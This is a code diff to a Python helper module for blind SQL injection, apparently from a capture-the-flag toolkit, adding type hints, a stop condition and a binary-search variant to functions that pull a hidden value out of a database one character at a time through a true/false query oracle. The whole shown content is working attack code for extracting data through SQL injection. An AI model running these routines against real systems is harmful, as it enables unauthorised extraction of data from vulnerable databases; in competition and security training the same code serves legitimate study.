@@ -2,6 +2,7 @@ import asyncio
 import functools
 import string
 import time
+from collections.abc import Awaitable, Callable, Sequence
 
 default_chars = (
 	string.ascii_lowercase
@@ -12,7 +13,7 @@ default_chars = (
 	+ string.punctuation.translate(str.maketrans("", "", "_{}"))
 )
 
-default_chars2 = (
+default_chars_full = (
 	string.ascii_lowercase
 	+ string.digits
 	+ "{}"
@@ -23,11 +24,19 @@ default_chars2 = (
 # make sure GLOB and LIKE special characters match last
 
 
-def blind_sqli(sqli_oracle, inject_template="{}", chars=default_chars):
+default_chars_min = string.ascii_lowercase + "_" + string.digits + "{}"
+
+
+def blind_sqli(
+	sqli_oracle: Callable[[str], str],
+	inject_template: str = "{}",
+	stop_condition: Callable[[str], bool] = lambda val: False,
+	chars: Sequence[str] = default_chars,
+):
 	"""sqli_oracle takes a sql condition and returns if its true or false
 	inject_template is the template for injecting into sqli_oracle"""
 	val = ""
-	while True:
+	while not stop_condition(val):
 		for c in chars:
 			try:
 				curr_val = val + c
@@ -43,20 +52,54 @@ def blind_sqli(sqli_oracle, inject_template="{}", chars=default_chars):
 				break
 		else:
 			return val
+	return val
 
 
-async def _blind_sqli_async_helper(sqli_oracle, inject_template, val):
+def blind_sqli_bsearch(
+	sqli_oracle: Callable[[str], str],
+	inject_template: str = "{}",
+	stop_condition: Callable[[str], bool] = lambda val: False,
+	chars: Sequence[str] = default_chars_min,
+):
+	""" assumes sqli_oracle returns curr < flag"""
+	val = ""
+	chars = sorted(chars)
+	while not stop_condition(val):
+		left = 0
+		right = len(chars)
+		while right - left > 1:
+			c = (left + right) // 2
+			curr_val = val + chars[c]
+			res = sqli_oracle(inject_template.format(curr_val))
+			print(curr_val, res)
+			if res:
+				right = c
+			else:
+				left = c
+		val += chars[left]
+		print(val)
+	return val
+
+
+async def _blind_sqli_async_helper(
+	sqli_oracle: Callable[[str], Awaitable[str]], inject_template: str, val: str
+):
 	res = await sqli_oracle(inject_template.format(val))
 	print(val, res)
 	return res, val
 
 
-async def blind_sqli_async(sqli_oracle, inject_template="{}", chars=default_chars):
+async def blind_sqli_async(
+	sqli_oracle: Callable[[str], Awaitable[str]],
+	inject_template: str = "{}",
+	stop_condition: Callable[[str], bool] = lambda val: False,
+	chars: Sequence[str] = default_chars,
+):
 	"""sqli_oracle takes a sql condition and returns if its true or false
 	inject_template is the template for injecting into sqli_oracle"""
 	val = ""
 	helper = functools.partial(_blind_sqli_async_helper, sqli_oracle, inject_template)
-	while True:
+	while not stop_condition(val):
 		coros = [asyncio.create_task(helper(val + c)) for c in chars]
 		for coro in asyncio.as_completed(coros):
 			success, curr_val = await coro
@@ -67,6 +110,7 @@ async def blind_sqli_async(sqli_oracle, inject_template="{}", chars=default_char
 				break
 		else:
 			return val
+	return val
 
 
 # use with str.replace("$o",offset).replace("$t",table_name)
